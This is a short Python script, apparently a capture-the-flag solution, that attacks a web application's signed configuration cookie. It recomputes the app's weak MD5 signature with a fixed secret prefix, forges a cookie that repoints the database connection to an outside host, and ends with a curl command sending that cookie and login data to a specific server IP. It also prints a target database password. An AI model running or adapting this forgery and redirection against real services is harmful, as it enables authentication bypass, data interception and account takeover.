import hashlib 
import urllib

def _generate_sig(data):
	data = data.lower()
	return hashlib.md5("x" + data).hexdigest()

data = "app_name=hsl&db_name=hsl&db_user=hsl&db_passwd=CBXN2a@-Q_aV@7D_&db_host=localhost"
data = urllib.quote(data)
print data

print _generate_sig(data)
print _generate_sig(data) == "2e3408c61118229d8e3c9b380a7ab2bb"

data = "app_name=hsl&db_name=marioy&db_user=marioyc&db_passwd=marioyc&db_host=db4free.net"
data = urllib.quote(data)
print data
print _generate_sig(data)

"""
curl 'http://54.83.207.93:5252/' -H 'Cookie: sig=470af67635ecea4c3e81e9ecdb3dba7b; config=app_name%3Dhsl%26db_name%3Dmarioy%26db_user%3Dmarioyc%26db_passwd%3Dmarioyc%26db_host%3Ddb4free.net' --data 'user=mario&password=mario&submit=Submit'
"""